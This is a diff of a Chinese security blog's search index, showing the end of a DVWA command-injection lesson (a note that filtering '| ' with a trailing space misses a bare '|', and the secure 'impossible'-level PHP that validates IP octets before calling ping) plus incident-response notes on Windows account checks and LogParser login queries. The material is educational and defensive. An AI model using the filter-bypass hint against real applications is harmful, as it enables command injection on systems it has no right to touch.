class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>单纯进行了拓宽，效果不好，注意“| ”后是有一个空格的，“|”不带空格的拦截不了，开发时注意</p>
-<h4 id="8-防御-impossible"><a href="#8-防御-impossible" class="headerlink" title="8. 防御 impossible"></a>8. 防御 impossible</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>重点是其中的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	<span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="number">2</span>    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="number">3</span>    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="number">4</span>        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>
-
-<p>1.将用户输入中的反斜线去掉，防止转义字符</p>
-<p>2.将输入的Ip按照”.”分开</p>
-<p>3.判断分开的每个部分是不是都是数字并且总的数量为4</p>
-<p>4.再将4个部分的数字用三个“.”给拼接起来</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
+    <title>账户安全</title>
     <url>/2023/10/13/%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<p>title: 账户安全<br>date: ‎2023-7‎-‎15‎ 16:42:23<br>tags: [账户安全]<br>categories: [账户安全]</p>
-<h3 id="1-账户安全"><a href="#1-账户安全" class="headerlink" title="1. 账户安全"></a>1. 账户安全</h3><h4 id="1-系统命令排查用户情况"><a href="#1-系统命令排查用户情况" class="headerlink" title="1. 系统命令排查用户情况"></a>1. 系统命令排查用户情况</h4><ul>
+    <content><![CDATA[<h3 id="1-账户安全"><a href="#1-账户安全" class="headerlink" title="1. 账户安全"></a>1. 账户安全</h3><h4 id="1-系统命令排查用户情况"><a href="#1-系统命令排查用户情况" class="headerlink" title="1. 系统命令排查用户情况"></a>1. 系统命令排查用户情况</h4><ul>
 <li>query user：查看当前登录账户</li>
 <li>logoff ID：注销用户ID</li>
 <li>net user：查看用户</li>
@@ -1295,5 +1356,11 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>
 
 <h4 id="4-webshell的查杀"><a href="#4-webshell的查杀" class="headerlink" title="4. webshell的查杀"></a>4. webshell的查杀</h4>]]></content>
+      <categories>
+        <category>账户安全</category>
+      </categories>
+      <tags>
+        <tag>账户安全</tag>
+      </tags>
   </entry>
 </search>
